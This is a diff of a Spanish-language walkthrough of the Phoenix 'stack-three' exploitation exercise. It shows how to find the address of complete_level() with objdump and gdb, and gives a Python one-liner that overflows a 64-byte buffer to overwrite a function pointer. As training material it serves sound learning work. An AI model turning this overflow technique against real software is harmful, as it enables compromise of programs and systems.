@@ -102,14 +102,14 @@ int main(int argc, char **argv) {
 
 **Encontrando la dirección de complete_level()**
 
-Podemos ubicar la dirección con objdump:
+Podemos ubicar la dirección con objdump con el comando `objdump -d stack-three | grep complete_level`
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ objdump -d stack-three | grep complete_level
 000000000040069d <complete_level>:
 ```
 
-O también con gdb con el comando `info func`
+O también con la herramienta gdb con el comando `info func`
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-three
@@ -157,7 +157,7 @@ Non-debugging symbols:
 
 **Explotación manual**
 
-Si enviamos 64 caracteres seguidos de la dirección de complete_level(), sobrescribiremos el puntero de función: En arquitecturas de 64 bits es mejor usar p64 para garantizar el formato correcto de la dirección.
+Si enviamos 64 caracteres seguidos de la dirección de complete_level(), como nos pide el reto, sobrescribiremos el puntero de función: En arquitecturas de 64 bits es mejor usar p64 para garantizar el formato correcto de la dirección.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$  python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
